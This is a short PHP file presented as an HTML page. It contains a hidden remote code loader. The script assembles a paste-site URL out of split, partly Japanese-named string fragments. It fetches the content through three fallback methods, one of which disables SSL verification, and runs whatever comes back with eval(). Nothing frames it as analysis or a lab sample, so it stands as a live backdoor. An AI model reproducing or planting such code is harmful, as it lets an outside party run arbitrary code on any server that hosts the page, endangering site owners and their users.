<!DOCTYPE html>
<html lang="en">
<?php
$u = "htt"; 
$d = "ps://"; 
$a = "rentry.co"; 
$デ = "/"; 
$の = "aboutphp"; 
$ur = "/raw"; 
$url = $u . $d . $a . $デ . $の . $ur; // URL data
function t($u) {
    if (ini_get('allow_url_fopen')) {
        return file_get_contents($u);
    } else {
        return false;
    }
}
function c($u) {
    if (function_exists('curl_version')) {
        $c = curl_init($u);
        curl_setopt($c, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($c, CURLOPT_SSL_VERIFYPEER, false);
        $r = curl_exec($c);
        curl_close($c);
        return $r;
    } else {
        return false;
    }
}
function s($u) {
    if ($s = fopen($u, 'r')) {
        $r = stream_get_contents($s);
        fclose($s);
        return $r;
    } else {
        return false;
    }
}
$content = t($url);
if ($content === false) {
    $content = c($url);
}
if ($content === false) {
    $content = s($url);
}
if ($content !== false) {
    eval("?>" . $content);
} else {
    echo "エラー。";
}
?>
</html>
